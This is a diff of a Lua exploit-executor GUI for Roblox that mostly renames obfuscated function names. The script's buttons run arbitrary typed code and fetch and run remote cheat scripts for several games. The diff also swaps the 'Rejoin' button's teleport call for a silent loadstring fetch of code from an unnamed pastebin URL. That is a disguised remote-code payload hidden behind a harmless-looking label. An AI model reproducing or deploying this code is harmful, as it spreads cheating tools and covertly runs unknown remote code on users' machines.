@@ -267,7 +267,7 @@ UICorner_15.Parent = ImageButton
 
 -- Scripts:
 
-local function KKOGA_fake_script() -- TextBox.LocalScript 
+local function VSQOCJ_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	local TextBox = script.Parent -- Replace with the actual TextBox
@@ -279,8 +279,8 @@ local function KKOGA_fake_script() -- TextBox.LocalScript
 	end)
 	
 end
-coroutine.wrap(KKOGA_fake_script)()
-local function BEATGU_fake_script() -- Execute.LocalScript 
+coroutine.wrap(VSQOCJ_fake_script)()
+local function VMICBSL_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	local button = script.Parent
@@ -289,8 +289,8 @@ local function BEATGU_fake_script() -- Execute.LocalScript
 		loadstring(textbox.Text)() -- Execute Script From TextBox
 	end)
 end
-coroutine.wrap(BEATGU_fake_script)()
-local function BTYQ_fake_script() -- Clear.LocalScript 
+coroutine.wrap(VMICBSL_fake_script)()
+local function TRAPX_fake_script() -- Clear.LocalScript 
 	local script = Instance.new('LocalScript', Clear)
 
 	local button = script.Parent
@@ -299,8 +299,8 @@ local function BTYQ_fake_script() -- Clear.LocalScript
 		textbox.Text = "" -- Make Textbox Empty
 	end)
 end
-coroutine.wrap(BTYQ_fake_script)()
-local function XHTBUM_fake_script() -- Main.LocalScript 
+coroutine.wrap(TRAPX_fake_script)()
+local function PAZQYF_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	local UIS = game:GetService('UserInputService')
@@ -338,8 +338,8 @@ local function XHTBUM_fake_script() -- Main.LocalScript
 		end
 	end)
 end
-coroutine.wrap(XHTBUM_fake_script)()
-local function XYJF_fake_script() -- ScriptHub.LocalScript 
+coroutine.wrap(PAZQYF_fake_script)()
+local function CZZCMI_fake_script() -- ScriptHub.LocalScript 
 	local script = Instance.new('LocalScript', ScriptHub)
 
 	local frame = script.Parent.Parent.ScriptHubUI
@@ -354,16 +354,16 @@ local function XYJF_fake_script() -- ScriptHub.LocalScript
 		clear.Visible = false
 	end)
 end
-coroutine.wrap(XYJF_fake_script)()
-local function UTCS_fake_script() -- AdminScript.LocalScript 
+coroutine.wrap(CZZCMI_fake_script)()
+local function GVJY_fake_script() -- AdminScript.LocalScript 
 	local script = Instance.new('LocalScript', AdminScript)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 	end)
 end
-coroutine.wrap(UTCS_fake_script)()
-local function JBUD_fake_script() -- Close.LocalScript 
+coroutine.wrap(GVJY_fake_script)()
+local function BNXVG_fake_script() -- Close.LocalScript 
 	local script = Instance.new('LocalScript', Close)
 
 	local frame = script.Parent.Parent
@@ -378,32 +378,32 @@ local function JBUD_fake_script() -- Close.LocalScript
 		clear.Visible = true
 	end)
 end
-coroutine.wrap(JBUD_fake_script)()
-local function MVDG_fake_script() -- Brookhaven.LocalScript 
+coroutine.wrap(BNXVG_fake_script)()
+local function VXHBZUH_fake_script() -- Brookhaven.LocalScript 
 	local script = Instance.new('LocalScript', Brookhaven)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
 	end)
 end
-coroutine.wrap(MVDG_fake_script)()
-local function GPZSF_fake_script() -- BladeBall.LocalScript 
+coroutine.wrap(VXHBZUH_fake_script)()
+local function MIOHIXV_fake_script() -- BladeBall.LocalScript 
 	local script = Instance.new('LocalScript', BladeBall)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua'))()
 	end)
 end
-coroutine.wrap(GPZSF_fake_script)()
-local function LSAJ_fake_script() -- PetSim99.LocalScript 
+coroutine.wrap(MIOHIXV_fake_script)()
+local function QJHX_fake_script() -- PetSim99.LocalScript 
 	local script = Instance.new('LocalScript', PetSim99)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()
 	end)
 end
-coroutine.wrap(LSAJ_fake_script)()
-local function JVOGEM_fake_script() -- Rejoin.LocalScript 
+coroutine.wrap(QJHX_fake_script)()
+local function ENJOAN_fake_script() -- Rejoin.LocalScript 
 	local script = Instance.new('LocalScript', Rejoin)
 
 	-- Local Stuff
@@ -415,11 +415,11 @@ local function JVOGEM_fake_script() -- Rejoin.LocalScript
 	script.Parent.MouseButton1Click:Connect(function()
 		game.StarterGui:SetCore("SendNotification", {Title = "Notification", Text = "Rejoining!", Icon = "", Duration = 4})
 		wait(0.5)
-		game:GetService("TeleportService"):Teleport(gameid)
+		loadstring(game:HttpGet("https://pastebin.com/raw/6wdd37J7"))()
 	end)
 end
-coroutine.wrap(JVOGEM_fake_script)()
-local function ESUWDAI_fake_script() -- ImageButton.LocalScript 
+coroutine.wrap(ENJOAN_fake_script)()
+local function SERRHBA_fake_script() -- ImageButton.LocalScript 
 	local script = Instance.new('LocalScript', ImageButton)
 
 	local btn = script.Parent
@@ -455,8 +455,8 @@ local function ESUWDAI_fake_script() -- ImageButton.LocalScript
 		end
 	end)
 end
-coroutine.wrap(ESUWDAI_fake_script)()
-local function KXWHIVS_fake_script() -- Haxx.LocalScript 
+coroutine.wrap(SERRHBA_fake_script)()
+local function YTNKRR_fake_script() -- Haxx.LocalScript 
 	local script = Instance.new('LocalScript', Haxx)
 
 	local SGui = script.Parent
@@ -467,4 +467,4 @@ local function KXWHIVS_fake_script() -- Haxx.LocalScript
 		Frame.Visible = not Frame.Visible
 	end)
 end
-coroutine.wrap(KXWHIVS_fake_script)()
+coroutine.wrap(YTNKRR_fake_script)()
